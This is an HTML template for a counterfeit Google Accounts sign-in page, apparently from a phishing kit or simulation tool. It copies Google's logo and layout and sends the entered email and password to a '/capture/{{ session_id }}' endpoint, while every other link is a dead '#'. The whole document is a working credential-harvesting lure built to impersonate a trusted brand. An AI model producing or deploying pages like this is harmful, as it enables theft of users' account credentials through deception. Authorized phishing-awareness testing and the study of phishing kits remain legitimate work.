<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    font-family:'Google Sans','Noto Sans Myanmar UI',Arial,sans-serif;
    background:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh
}
.container{max-width:450px;width:100%;padding:48px 40px 36px}
.card{
    border:1px solid #dadce0;
    border-radius:28px;
    padding:48px 40px 36px;
    text-align:center
}
.logo{margin-bottom:16px}
.logo svg{width:75px;height:24px}
h1{font-size:28px;font-weight:400;color:#202124;margin-bottom:8px;letter-spacing:-0.5px}
.sub{font-size:16px;color:#5f6368;margin-bottom:32px;font-weight:400}
.input-group{position:relative;margin-bottom:20px;text-align:left}
.input-group input{
    width:100%;
    padding:17px 15px;
    border:1px solid #dadce0;
    border-radius:24px;
    font-size:16px;
    outline:none;
    color:#202124;
    font-family:'Google Sans',Arial,sans-serif;
    transition:border-color .15s
}
.input-group input:focus{border-color:#1a73e8}
.input-group label{
    position:absolute;
    left:15px;
    top:17px;
    color:#5f6368;
    font-size:16px;
    pointer-events:none;
    background:#fff;
    padding:0 4px;
    transition:.15s
}
.input-group input:focus + label,
.input-group input:not(:placeholder-shown) + label{
    top:-9px;
    left:12px;
    font-size:11px;
    color:#1a73e8
}
.forgot{text-align:left;margin-bottom:40px}
.forgot a{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;display:inline-block;padding:5px 0}
.forgot a:hover{background:#f8faff;border-radius:4px}
.guest{text-align:left;margin-top:32px;font-size:14px;color:#5f6368;line-height:1.5}
.guest a{color:#1a73e8;font-weight:500;text-decoration:none}
.guest a:hover{background:#f8faff;border-radius:4px;padding:3px}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
.actions .create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;padding:8px 12px;border-radius:4px}
.actions .create:hover{background:#f8faff}
.actions button{
    background:#1a73e8;
    color:#fff;
    border:none;
    border-radius:100px;
    padding:9px 24px;
    min-width:88px;
    font-size:14px;
    font-weight:500;
    cursor:pointer;
    font-family:'Google Sans',Arial,sans-serif
}
.actions button:hover{background:#1557b0;box-shadow:0 1px 2px rgba(0,0,0,.15)}
.footer-links{text-align:center;margin-top:24px;font-size:12px;color:#5f6368}
.footer-links a{color:#5f6368;text-decoration:none;margin:0 16px}
.footer-links a:hover{color:#202124}
</style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24"><path fill="#4285f4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.56-.04-1.07-.13-1.54H9.24z"/><text x="25" y="18" font-size="18" font-weight="bold" fill="#5f6368">Google</text></svg>
        </div>
        <h1>Sign in</h1>
        <p class="sub">Use your Google Account</p>
        <form action="/capture/{{ session_id }}" method="POST">
            <div class="input-group">
                <input type="text" name="username" placeholder="" required>
                <label>Email or phone</label>
            </div>
            <div class="forgot"><a href="#">Forgot email?</a></div>
            <div class="input-group">
                <input type="password" name="password" placeholder="" required>
                <label>Enter your password</label>
            </div>
            <div class="guest">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></div>
            <div class="actions">
                <a href="#" class="create">Create account</a>
                <button type="submit">Next</button>
            </div>
        </form>
    </div>
    <div class="footer-links">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>
</div>
</body>
</html>
